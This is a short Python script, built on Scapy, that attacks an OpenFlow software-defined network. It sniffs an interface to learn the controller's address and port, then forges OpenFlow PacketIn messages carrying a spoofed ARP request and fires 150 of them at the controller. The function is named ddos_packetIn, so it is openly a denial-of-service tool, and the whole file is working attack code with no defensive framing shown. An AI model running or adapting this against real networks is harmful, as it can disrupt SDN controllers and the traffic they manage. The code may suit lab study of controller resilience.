#! /usr/bin/env python3

from scapy.all import *
from scapy.contrib.openflow3 import *

def run_sniff():
    packet = sniff(iface = "eth1", timeout=15)
    for p in packet:
        if OFPTPacketOut in p:
            ctrl_ip = str(p[0][1].src)
            ctrl_port = p[0][1].sport
            break
    return ctrl_ip, ctrl_port

def ddos_packetIn():
    ctrl_ip, ctrl_port = run_sniff()
    print("Controller IP: "+ctrl_ip)
    print("Controller Port: "+str(ctrl_port))
    source_port = 55555
    IP1 = IP(dst = ctrl_ip)
    TCP1 = TCP(sport = source_port, dport = ctrl_port)
    ARP1 = Ether(src='00:00:00:00:00:01', dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, hwsrc='00:00:00:00:00:01', hwdst='00:00:00:00:00:00', psrc='10.0.0.1', pdst='10.0.0.2')
    pkt = IP1 / TCP1 / OFPTPacketIn(version=4, data=bytes(ARP1))
    pkt.show()
    for i in range(150):
        send(pkt, inter=0)
        print ("Packets Sent:", i, "Source Port: ", source_port)

ddos_packetIn()
